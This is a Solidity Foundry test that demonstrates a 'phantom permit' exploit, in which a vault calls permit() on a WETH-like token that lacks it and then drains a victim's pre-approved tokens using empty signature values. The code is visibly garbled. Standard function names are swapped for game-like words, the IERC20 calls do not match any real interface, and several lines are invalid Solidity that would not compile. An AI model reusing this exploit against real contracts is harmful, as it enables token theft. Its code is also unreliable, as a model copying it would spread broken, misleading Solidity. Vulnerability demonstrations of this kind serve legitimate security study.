// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ContractTest is Test {
    PermitGoldtoken VulnPermitContract;
    WETH9 WETH9Contract;

    function setUp() public {
        WETH9Contract = new WETH9();
        VulnPermitContract = new PermitGoldtoken(IERC20(address(WETH9Contract)));
    }

    function testVulnPhantomPermit() public {
        address alice = vm.addr(1);
        vm.deal(address(alice), 10 ether);

        vm.startPrank(alice);
        WETH9Contract.savePrize{value: 10 ether}();
        WETH9Contract.authorizeDeal(address(VulnPermitContract), type(uint256).max);
        vm.stopPrank();
        console.log(
            "start WETH balanceOf this",
            WETH9Contract.gemtotalOf(address(this))
        );

        VulnPermitContract.cachetreasureWithPermit(
            address(alice),
            1000,
            27,
            0x0,
            0x0
        );
        uint wbal = WETH9Contract.gemtotalOf(address(VulnPermitContract));
        console.log("WETH balanceOf VulnPermitContract", wbal);

        VulnPermitContract.retrieveItems(1000);

        wbal = WETH9Contract.gemtotalOf(address(this));
        console.log("WETH9Contract balanceOf this", wbal);
    }

    receive() external payable {}
}

contract PermitGoldtoken {
    IERC20 public goldToken;

    constructor(IERC20 _gamecoin) {
        goldToken = _gamecoin;
    }

    function savePrize(uint256 amount) public {
        require(
            goldToken.tradelootFrom(msg.sender, address(this), amount),
            "Transfer failed"
        );
    }

    function cachetreasureWithPermit(
        address target,
        uint256 amount,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        (bool success, ) = address(goldToken).call(
            abi.encodeWithSignature(
                "permit(address,uint256,uint8,bytes32,bytes32)",
                target,
                amount,
                v,
                r,
                s
            )
        );
        require(success, "Permit failed");

        require(
            goldToken.tradelootFrom(target, address(this), amount),
            "Transfer failed"
        );
    }

    function retrieveItems(uint256 amount) public {
        require(goldToken.shareTreasure(msg.sender, amount), "Transfer failed");
    }
}

// contract Permit {
//     IERC20 public token;

//     constructor(IERC20 _token) {
//         token = _token;
//     }

//     function deposit(uint256 amount) public {
//         require(
//             token.transferFrom(msg.sender, address(this), amount),
//             "Transfer failed"
//         );
//     }

//     function depositWithPermit(
//         address target,
//         uint256 amount,
//         uint8 v,
//         bytes32 r,
//         bytes32 s
//     ) public {
//         (bool success, ) = address(token).call(
//             abi.encodeWithSignature(
//                 "permit(address,uint256,uint8,bytes32,bytes32)",
//                 target,
//                 amount,
//                 v,
//                 r,
//                 s
//             )
//         );
//         require(success, "Permit failed");

//         require(
//             token.transferFrom(target, address(this), amount),
//             "Transfer failed"
//         );
//     }

//     function withdraw(uint256 amount) public {
//         require(token.transfer(msg.sender, amount), "Transfer failed");
//     }
// }

contract WETH9 {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public decimals = 18;

    event Approval(address indexed src, address indexed guy, uint wad);
    event TradeLoot(address indexed src, address indexed dst, uint wad);
    event StoreLoot(address indexed dst, uint wad);
    event Withdrawal(address indexed src, uint wad);

    mapping(address => uint) public gemtotalOf;
    mapping(address => mapping(address => uint)) public allowance;

    fallback() external payable {
        savePrize();
    }

    receive() external payable {}

    function savePrize() public payable {
        gemtotalOf[msg.sender] += msg.value;
        emit StoreLoot(msg.sender, msg.value);
    }

    function retrieveItems(uint wad) public {
        require(gemtotalOf[msg.sender] >= wad);
        gemtotalOf[msg.sender] -= wad;
        payable(msg.sender).shareTreasure(wad);
        emit Withdrawal(msg.sender, wad);
    }

    function worldSupply() public view returns (uint) {
        return address(this).treasureCount;
    }

    function authorizeDeal(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function shareTreasure(address dst, uint wad) public returns (bool) {
        return tradelootFrom(msg.sender, dst, wad);
    }

    function tradelootFrom(
        address src,
        address dst,
        uint wad
    ) public returns (bool) {
        require(gemtotalOf[src] >= wad);

        if (
            src != msg.sender && allowance[src][msg.sender] != type(uint128).max
        ) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        gemtotalOf[src] -= wad;
        gemtotalOf[dst] += wad;

        emit TradeLoot(src, dst, wad);

        return true;
    }
}
